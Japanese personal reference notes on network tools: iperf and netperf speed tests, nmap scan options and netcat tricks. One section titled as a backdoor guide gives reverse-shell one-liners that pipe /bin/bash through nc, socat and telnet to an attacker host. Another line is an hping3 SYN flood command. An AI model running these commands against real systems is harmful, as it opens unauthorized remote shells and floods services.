ネットワーク転送速度を調べるツール
============================

概要
----------------------------

ネットワーク転送速度を計るツールとしてはnetperf, iperfの主に2つが存在する。
僕の場合は以下の理由により主にiperfの方を利用している。

1. netperfの場合sshのフォワーディングが出来ないので、異なるサブネットワーク間で転送速度の測定が出来ないことがある
2. iperfの方がレポートが見やすい
3. netperfではサーバーとクライアント間のバージョンが一致しないと接続できない場合がある。

kuins net に繋ぐ
----------------

* dhcp で DHPC を割り振る
* 検索ドメイン名に kuins.net が存在するので、wpad.kuins.net の IP アドレスを申請
* host wpad.kuins.net
* wget http://10.224.253.12:80/wpad.dat
* wpad.dat 中に pac ファイルが存在する


ポートスキャン
----------------------------

ポートスキャンツールのデファクトスタンダードは nmap。

* `nmap`:
    ポートスキャンツール。
    サーバーがどのポートを使用しているか調べてくれる。
    * `-p number`: port range, 0-65535までのポートを指定できる, -p- を指定することで、全てのポート 0-65535 にパケットを送信できる
    * `-s[n | T | U | S | V]`: *ポートスキャンの種類を指定する*
        * n: ポートスキャンを行わない
        * T: TCPスキャン tcpコネクションが張れるかどうかを調べる
        * U: UDPスキャン 0バイトのパケットをUDPで送る。ICMP返却された場合閉じてると判断
        * S: TCP SYNスキャン SYNパケットを送って SYN/ACK が送られて来るかどうかを調べる
        * V: バージョン情報も精査したスキャン
        * -sN, -sF, -sX: TCP Null、FIN、およびXmasスキャン
           * scan flg に不正な状態が記述されていた場合 Closed ポートは RST フラグ, ポートを開いている場合は何も返却しない
           * 特にUnix 系列のサーバーに対して有効なスキャン方法である
        * -sS: プロトコルスキャン, ターゲットマシンがどのプロトコルをサポートしているか分かる
    * `-v`: verboseモード
    * `-P[n S A U E,P,M 0 R]`: *ネットワークスキャンの種類を指定する*
       * n: ping スキャンを行わない
       * S: TCP SYN Scan
       * A: TCP ACK Scan
       * E: 通常の ping スキャン ECHO リクエストを送る
       * R: ARP Scan
    * `--send-ip`: この指定が行われた時、ARP パケットなど低レベルのスキャンを行わない（同一ネットワークに ping スキャンしたい時使う）
    * `-O`: 対象ホストの OS 名を調べる
    * `-o filename`: 結果をファイルに出力する
    * `-i filename`: スキャン対象をファイルから読み込む

一切対象のサーバーにパケットを送らずに情報を調べる場合、List Scan を使う。
（DNS のみを用いて、調べる）

    $ nmap -sL hostname.com

ping scan を用いて, ネットワーク内の生きているノードを探す

    $ sudo nmap -sP 172.16.32.0/24

もしくは ping でブロードキャストを行い, arp テーブルを調べる。

    $ ping 172.16.32.255    
    $ arp -a
    
* arp scan: `nmap -v -sn -PR Network/CIDR`
* ping scan: `nmap -v -sn -PE --send-ip Network/CIDR`
* SYN scan: `nmap -v -sS -Pn -A Network/CIDR`
* 特定ポートの調査 TCP: `nmap -v -sS -Pn -p21,22,25,53,80,110,143,587,993,995 Network/CIDR`
* 特定ポートの調査 UDP: `nmap -v -sU -Pn -p6,53,69,123,137,161 Network/CIDR`
* フルスキャン TCP: `nmap -v -sS -p- -A Network/CIDR`
* フルスキャン UDP: `nmap -v -sU -p- -A Network/CIDR`

### ポートスキャン対策 ###

psad (Port Scan Attack Detector) というポートスキャン検知ツールを利用すればポートスキャンを発見できる。

/etc/psad/psad.conf の EMAIL_ADDRESS の部分は自分のメールアドレスに置き換えておくこと。

*参考サイト*

* [連載：不正侵入の手口と対策](http://www.atmarkit.co.jp/fsecurity/rensai/iprotect04/iprotect02.html)
* [脆弱性スクリプト](http://www.securityfocus.com/bid)
* [脆弱性データベース](http://www.exploit-db.com/platform/)
* [Privilege Escalation](http://www.dankalia.com/tutor/01005/0100501004.htm)

netperf
----------------------------

必ずソースからコンパイルし、**クライアントとサーバーのバージョンを合わせること**
バージョンが合わない場合正常に接続できないことがある。

(公式サイト)[ftp://ftp.netperf.org/netperf/]から最新版をダウンロードする。

    $ wget ftp://ftp.netperf.org/netperf/netperf-version.tar.gz
    $ tar zxvf netperf-version.tar.gz
    $ cd netperf-version 
    $ ./configure && make && make install

基本的にサーバー側でnetserverを立て、クライアント側はnetperfコマンドから接続する。

サーバー側の設定

    $ netserver
    Starting netserver with host 'IN(6)ADDR_ANY' port '12865' and family AF_UNSPEC

これでポート12865でパケットを待ち受ける。
iptablesで疎通できるように設定する。

    $ sudo emacs /etc/sysconfig/iptables
    # netperf 用に追加
    -A SERVICE -p tcp --dport 12865 -j ACCEPT
    -A SERVICE -p tcp --sport 0:65535 -j ACCEPT   
    
    $ sudo /etc/init.d/iptables restart

netperfのテストが終了したら上記の設定はコメントアウトし、再起動しておく。

クライアントからの接続。

    $ netperf -H IP 

iperf
----------------------------

### 基本的な使い方 ###

iperf をパッケージ管理ソフトからインストールする。
サーバー側での待受

    $ iperf -s
    
クライアント側からの接続

    $ iperf -c IPアドレス

### 応用例 ###

サーバー側から接続する場合の有用なオプション

* `-D, --daemon`: デーモンとして起動させる
* `-p, --port`: 待受ポート番号を指定する

サーバー側でデーモンとして起動させる

    $ iperf -s -D

クライアント側から接続する場合の有用なオプション

* `-p, --port`: 接続先ポート番号を指定する
* `-i, --interval`: 指定秒間経過後、レポート報告を行う
* `-P, --parallel`: 並行接続数を指定する
* `-n, --num [KM]`: 送信するデータ量を指定
* `-t, --time`: 送信する時間を指定する

10秒間, 10スレッドで接続する場合

    $ iperf -c IP -t 10 -P 10

1GB のデータを送信し, 5秒ごとにレポートを出力する場合

    $ iperf -c IP -n 1000M -i

nc コマンド
----------------------------

netcat 任意のポートに TCP・UDP コネクションを張れる

* `-l`: ポートを listen 用にオープンする
* `-n`: DNS サービスを使わない
* `-v`: 冗長モード
* `-vv`: 冗長モード
* `-w`: timeout 値を設定する
* `-z`: データを一切送信せずデーモンとして起動する

### 例 ###

#### 基本的な使い方 ####

5098 ポートにサーバーを作る。

    # サーバーとして起動させる
    $ nc -n -v  -l 5098
    
クライアントを 5098 ポートに接続させる。

    # 別ウインドウで 5098 ポートに接続
    $ nc localhost 5098
    
    # 何か文字を打つと, サーバー側に標準出力に文字が表示される
    hello
    
コネクションがつながった後は、サーバー側から文字を入力した場合もクライアントに伝わる。

    # サーバー側で打った場合も同様に、クライアント側の標準出力に文字が表示される
    hello

#### ポートスキャンとして利用する ####

1-1000 までのポートをスキャンする

    $ nc -v -n -z -w 1 servername 1-1000

#### 簡易 web サーバーとして利用する ####

web アクセス時に file.txt を表示させる。

    $ (echo "HTTP/1.0 200 Ok"; echo; cat file.txt) | sudo nc -l 80 
    
上記のサーバーの場合, 一度アクセスすればアクセスが切れるので、
永続的にアクセスできるようにするには while 分の中に入れればよい。

    $ while :; do (echo "HTTP/1.0 200 Ok"; echo; cat file) | sudo nc -l 80 2>&1 >/dev/null; done &; export N_PID=$!

止める時は N_PID のプロセスを止める。

    $ sudo kill $N_PID

### ファイル転送として利用する ###

サーバー側で待ち受ける

    $ nc -l 5555 | tar xzfp -  

クライアント側からファイルを送る

    $ tar czvfp - directory | nc servername 5555  

### プロキシーとして利用する ###

まず, 80 番ポートにサーバーを立てる。

    $ cat > file
    hello

    $ while :; do (echo "HTTP/1.0 200 Ok"; echo; cat file) | sudo nc -l 80 2>&1 >/dev/null; done &; export N_PID=$!

サーバーに接続できるかどうか確認

    $ telnet localhost 80
    Connected to localhost (127.0.0.1).
    Escape character is '^]'.
    HTTP/1.0 200 Ok
    
    hello
    
プロキシサーバーを通して 80 番ポートにアクセスする。

    $ mkfifo pipe
    $ nc -l 8080 <pipe 2>&1 | nc 127.0.0.1 80 2>&1 1>pipe &

これでプロキシサーバーが立った。
今度は 8080 番ポートにアクセスすると, 80 番ポートに自動にアクセスできる

    $ telnet localhost 8080
    Connected to localhost (127.0.0.1).
    Escape character is '^]'.
    HTTP/1.0 200 Ok
    
    hello

### メールを送信する ###

admin@IP から to@gmail.com にメールを送信する。

    $ nc -i 3 localhost  25 - <<!
    MAIL FROM: <admin@IP>                                   
    RCPT TO: <to@gmail.com>
    DATA
    This is a test mail
    .
    !
    220 www42226u.sakura.ne.jp ESMTP Sendmail 8.13.8/8.13.8; Sat, 19 Jan 2013 11:52:06 +0900
    250 2.1.0 <admin@IP>... Sender ok
    250 2.1.5 <to@gmail.com>... Recipient ok
    354 Enter mail, end with "." on a line by itself
    250 2.1.0 <admin@IP>... Sender ok
    250 2.1.5 <to@gmail.com>... Recipient ok
    354 Enter mail, end with "." on a line by itself
    250 2.1.0 <admin@IP>... Sender ok
    250 2.1.5 <to@gmail.com>... Recipient ok
    354 Enter mail, end with "." on a line by itself
    250 2.0.0 r0J2q6x7010672 Message accepted for delivery


バックドアの作り方
----------------------------

1. nc を使ってバックドアを空ける

netcat で -e オプションが使えない場合のバックドアの空け方

    mknod pipe p && nc remote_server 1337 0<pipe | /bin/bash 1>pipe

Freebsd など mknod のオプションが異なる場合は mkfifo でも同様に行える。
まず事前にパイプを作る。
  
    mkfifo pipe

その後はパイプを通して shell を直接リダイレクトさせればよい。

    nc remote_server 1337 0<pipe 2>&1 | /bin/bash 1>pipe 2>pipe

socat を使えば仮想端末をアタッチできる。
サーバー側で待受を行う。

2. socat を使ってバックドアをを作る

    $ sudo socat file:$(tty),raw,echo=0 tcp-listen:Port

クライアント側で送信を行う。

    $ socat tcp-connect:AttackerIP:Port exec:SHELL,pty,stderr,setsid,sigint,sane  

この時点でサーバー側でシェルが起動できるようになる。

3. telnet を使ってバックドアを作る

telnet 同士をポート同士でフォワーディングさせれば telnet を使ってもバックドアが出来る

    $ telnet AttakerIP 8008 | /bin/bash | telnet AttackerIP 8009

攻撃者は 8008, 8009 番のポートをそれぞれ待受にしておけばよい

    $ nc -n -l -vv 8008 &
    $ nc -n -l -vv 8009

ターゲットがパイプラインを通じて /bin/bash を実行することで対象のシェルを起動させることができる。
上記の場合 8008 番ポートでコマンドを実行し、 8009 番ポートで実行結果を閲覧することができる。


その他
----------------------------

bind のバージョンの調べ方

    $ dig @nameserver version.bind txt chaos

SYN Flood 攻撃を行う

    $ hping3 -i u1000 -S -p 443 xxx.xxx.xxx.xxx
    
オプションの説明
* `-i interval`: 間隔, u1000 は 1000 マイクロセカンドを表す
* `-c count`: 送信するパケット数
* `-s`: syn flag をセットする
* `-p`: 送信先ポート

* オートネゴシエーションを切り、リンクを手動で設定する: 全2重 + 100Mbps の場合
  `ethtool -s eth0 autoneg off speed 100 duplex full`

* ip コマンドの使い方
  * インターフェイスを起動させる: `ip link set dev eth0 up`
  * IP アドレス・ネットワークマスクを設定する: `ip addr add 10.0.2.11/24 dev eth0`:
  * デフォルトゲートウィの設定: `ip route add default via 10.0.2.1`

権限昇格
----------------------------

* [Basic Linux Privilege Escalation](http://g0tmi1k.blogspot.jp/2011/08/basic-linux-privilege-escalation.html)
